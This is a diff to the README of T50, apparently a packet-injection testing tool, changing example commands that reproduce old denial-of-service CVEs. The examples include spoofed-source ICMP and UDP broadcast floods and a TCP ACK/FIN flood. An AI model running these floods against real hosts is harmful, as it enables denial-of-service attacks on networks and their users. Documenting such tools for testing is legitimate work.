@@ -117,7 +117,7 @@ The main differentiator of the **T50** is that it is able to send all protocols,
 3. [CVE-1999-0513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0513):
 * ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --protocol ICMP --icmp-type 8 --icmp-code 0 --flood```
 4. [CVE-1999-0514](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0514):
-* ```$ sudo ./t50 [broadcast-address] --dport [target-port] --saddr [target-address] --protocol UDP --flood```
+* ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --sport [target-port] --protocol UDP --flood```
 5. [CVE-2002-1712](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1712):
 * ```$ sudo ./t50 [target-address]  --dport [target-port] --protocol TCP --ack --fin --window 16384 --flood```
 
